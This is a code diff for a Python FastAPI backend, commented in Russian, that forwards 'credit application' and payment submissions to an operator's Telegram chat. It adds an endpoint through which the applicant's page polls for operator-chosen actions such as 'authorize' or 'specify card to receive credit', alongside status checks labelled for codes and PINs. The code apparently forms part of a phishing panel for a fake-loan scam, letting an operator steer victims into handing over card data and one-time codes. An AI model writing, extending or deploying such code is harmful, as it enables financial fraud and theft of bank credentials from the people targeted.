@@ -125,7 +125,8 @@ async def submit_credit_application(data: CreditApplicationData):
         "amount": data.amount,
         "payment": data.payment,
         "user_chat_id": data.user_chat_id,
-        "status": "waiting_action"
+        "status": "waiting_action",
+        "pending_action": None
     }
     
     message = (
@@ -218,7 +219,20 @@ async def submit_payment(data: PaymentData):
     send_to_telegram(MY_CHAT_ID, message)
     return {"status": "ok"}
 
-# ========== 6. ПРОВЕРКА СТАТУСА ==========
+# ========== 6. ПРОВЕРКА СТАТУСА ДЛЯ АВТОРИЗАЦИИ/ОПЛАТЫ ==========
+@app.get("/check_action_status/{session_id}")
+async def check_action_status(session_id: str):
+    session = sessions.get(session_id)
+    if not session:
+        return {"status": "not_found"}
+    
+    action = session.get("pending_action", None)
+    if action:
+        session["pending_action"] = None
+        return {"action": action}
+    return {"action": None}
+
+# ========== 7. ПРОВЕРКА СТАТУСА ДЛЯ КОДА/PIN ==========
 @app.get("/check_status/{session_id}")
 async def check_status(session_id: str):
     session = sessions.get(session_id)
@@ -238,7 +252,7 @@ async def check_status(session_id: str):
     else:
         return {"status": status}
 
-# ========== 7. ОБРАБОТКА КНОПОК ==========
+# ========== 8. ОБРАБОТКА КНОПОК ==========
 @app.post("/webhook/callback")
 async def handle_callback(request: Request):
     data = await request.json()
@@ -263,6 +277,8 @@ async def handle_callback(request: Request):
     # ===== КНОПКА "АВТОРИЗАЦИЯ" =====
     if action == "auth":
         if user_chat_id:
+            if session:
+                session["pending_action"] = "auth"
             send_to_telegram(
                 str(user_chat_id),
                 "🔐 *Требуется авторизация*\n\nНеобходимо авторизоваться для получения кредита"
@@ -278,6 +294,8 @@ async def handle_callback(request: Request):
     # ===== КНОПКА "ОПЛАТА" =====
     elif action == "pay":
         if user_chat_id:
+            if session:
+                session["pending_action"] = "pay"
             send_to_telegram(
                 str(user_chat_id),
                 "💳 *Требуется оплата*\n\nДля получения кредита укажите карту"
